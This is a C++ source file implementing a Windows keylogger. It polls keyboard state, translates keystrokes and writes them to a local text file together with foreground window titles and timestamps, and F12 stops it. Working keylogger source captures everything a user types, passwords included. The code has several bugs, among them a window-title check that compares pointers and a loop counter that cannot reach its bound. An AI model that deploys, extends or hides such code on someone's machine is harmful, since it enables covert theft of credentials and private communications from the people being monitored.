//
// Created by avita on 25/02/2021.
//
#define WIN32_LEAN_AND_MEAN


#include "Keylogger.h"

Keylogger::Keylogger() {}


void Keylogger::writeKeyToFile(char key) {
    hWindowHandle = GetForegroundWindow(); //Getting handle to the focus window
    threadId = GetWindowThreadProcessId(hWindowHandle, NULL); //Getting the thread Id of the focus window thread


    wchar_t *buff = (wchar_t *) malloc(100 * sizeof(wchar_t));
    ::GetWindowTextW(hWindowHandle, buff, 100 * sizeof(wchar_t));


    //Checking if the focus window has changed
    if (buff != windowName) {
        ::GetLocalTime(&st);
        file << "\n" << buff << " " << st.wDay << "." << st.wMonth << "."
             << st.wYear
             << " And the Time is "
             << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "\n";
        windowName = buff;
    }
    free(buff);


    kState = (BYTE *) malloc(256);
    GetKeyboardState(kState); //Getting the keyboard state and saving it in kState
    hkl = GetKeyboardLayout(threadId);
    wchar_t UniChar[2] = {0}; //The size of wchar_t is 2 bytes
    ToUnicodeEx(key, key, (BYTE *) kState, UniChar, 2, NULL, hkl); //Converting key to unicode in

    file << UniChar;
    free(kState);
}

bool Keylogger::deleteKeyloggerData() {
    file.flush();
    file.close();
    file.open("C:\\C_projects\\Keylogger.txt");
    if (!file.is_open())
        return false;
    return true;
}


int Keylogger::startKeylogger(Keylogger keylogger) {
    //Opening the keylogger file
    keylogger.file.open("C:\\C_projects\\Keylogger.txt"); //open the file in unicode mode


    //Checking if the file is open
    if (!keylogger.file.is_open()) {
        cerr << "Cant open the file (Constructor)" << endl;
        return -1;
    }
    ::GetLocalTime(&keylogger.st);
    cout << "Keylogger::startKeylogger():start:" << keylogger.st.wMilliseconds << endl;
    bool capsLock = GetKeyState(VK_CAPITAL); //Checking if the capsLock is on or off
    keylogger.file.imbue(keylogger.utf8_locale);

    char key;

    //Writing to the keylogger file the starts time
    keylogger.file << "The Keylogger has started The Date is " << keylogger.st.wDay << "." << keylogger.st.wMonth << "."
                   << keylogger.st.wYear
                   << " And the Time is "
                   << keylogger.st.wHour << ":" << keylogger.st.wMinute << ":" << keylogger.st.wSecond << endl;


    //Writing to the keylogger file the focus window name
    wchar_t *buff = (wchar_t *) malloc(100 * sizeof(wchar_t));
    keylogger.hWindowHandle = ::GetForegroundWindow();
    ::GetWindowTextW(keylogger.hWindowHandle, buff, 100 * sizeof(wchar_t));
    keylogger.windowName = buff;
    keylogger.file << "The Window Name is " << buff << "\n";
    free(buff);

    keylogger.run = true;

    while (keylogger.run) {
        Sleep(10);
        //Checking if a key has pressed
        for (key = 8; key <= 256 && keylogger.run; key++) {

            if (GetAsyncKeyState(key) == 6) {

                switch (key) {
                    case VK_SPACE:
                        keylogger.file << ' ';
                        break;
                    case VK_RETURN:
                        keylogger.file << '\n';
                        break;
                    case VK_BACK:
                        keylogger.file << "[BACKSPACE]";
                        break;
                    case VK_CAPITAL:
                        capsLock = !capsLock;
                        break;
                    case VK_SHIFT:
                        keylogger.file << "[SHIFT]";
                        break;
                    case VK_CONTROL:
                        keylogger.file << "[CTRL]";
                        break;
                    case VK_ESCAPE:
                        keylogger.file << "[ESCAPE]";
                        break;
                    case VK_MENU:
                        keylogger.file << "[ALT]";
                        break;
                    case VK_TAB:
                        keylogger.file << "[TAB]";
                        break;
                    case VK_F12:
                        cout << "F12 was pressed quitting" << endl;
                        keylogger.run = false;
                        break;
                    case VK_F1:
                    case VK_F2:
                    case VK_F3:
                    case VK_F4:
                    case VK_F5:
                    case VK_F6:
                    case VK_F7:
                    case VK_F8:
                    case VK_F9:
                    case VK_F10:
                    case VK_F11:
                    case VK_DELETE:
                    case VK_LWIN:
                    case VK_RWIN:
                    case VK_PRINT:
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                    case VK_SNAPSHOT:
                    case VK_INSERT:
                    case VK_HELP:
                    case VK_LEFT:
                    case VK_UP:
                    case VK_RIGHT:
                    case VK_DOWN:
                    case VK_HOME:
                    case VK_END:
                    case VK_PRIOR:
                    case VK_NEXT:
                    case VK_PAUSE:
                    case VK_MEDIA_PLAY_PAUSE:
                    case VK_MEDIA_STOP:
                    case VK_MEDIA_NEXT_TRACK:
                    case VK_MEDIA_PREV_TRACK:
                    case VK_SCROLL:
                    case VK_PLAY:
                    case VK_NUMLOCK:
                        break;
                    default:
                        if (capsLock)
                            keylogger.file << key;
                        else
                            keylogger.writeKeyToFile(key);
                }
            }
        }
    }
    ::GetLocalTime(&keylogger.st);
    keylogger.file << "\nThe Keylogger closed The Date is " << keylogger.st.wDay << "."
                   << keylogger.st.wMonth << "."
                   << keylogger.st.wYear
                   << " And the Time is "
                   << keylogger.st.wHour << ":" << keylogger.st.wMinute << ":"
                   << keylogger.st.wSecond << endl;
    keylogger.file.flush();
    keylogger.file.close();
    cout << "Quitting the keylogger" << endl;
    return 1;
}